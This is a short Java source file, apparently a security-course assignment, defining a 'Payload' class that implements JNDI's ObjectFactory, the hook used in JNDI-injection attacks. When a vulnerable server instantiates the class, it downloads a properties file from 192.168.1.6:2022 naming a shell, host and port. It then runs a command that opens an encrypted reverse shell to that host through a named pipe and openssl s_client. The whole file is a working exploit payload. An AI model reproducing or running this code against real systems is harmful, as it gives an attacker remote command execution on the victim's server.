import java.net.*;
import java.io.*;
import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;
/**
 *
 * @author      Muhammad Nur Irsyad
 * @id          1807422020
 * @class       CCIT SEC 8 (TMJ)
 */
public class Payload implements ObjectFactory {
    private static Process p;
    private static String shell = "";
    private static String host = "";
    private static int port = 0;
    //----------
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        URL url;
        try {
            url = new URL("http://192.168.1.6:2022/revshell.properties");
            InputStream in;
            try {
                in = url.openStream();
                Reader reader = new InputStreamReader(in, "UTF-8");
                Properties properties = new Properties();
                try {properties.load(reader);} finally {reader.close();}
                //
                shell = properties.getProperty("SHELL");
                host = properties.getProperty("HOST");
                port = Integer.parseInt(properties.getProperty("PORT_LISTENER"));
                //
            } catch (IOException ex) {Logger.getLogger(Payload.class.getName()).log(Level.SEVERE, null, ex);}
        } catch (MalformedURLException ex) {Logger.getLogger(Payload.class.getName()).log(Level.SEVERE, null, ex);}      
        //----------
        try {
            p = Runtime.getRuntime().exec(shell+" -c $@|"+shell+" 0 echo mkfifo /tmp/s; "+shell+" -i < /tmp/s 2>&1 | openssl s_client -quiet -connect "+host+":"+port+" > /tmp/s 2> /dev/null; rm /tmp/s");
        } catch (Exception e) {}
        return null;
    }
}
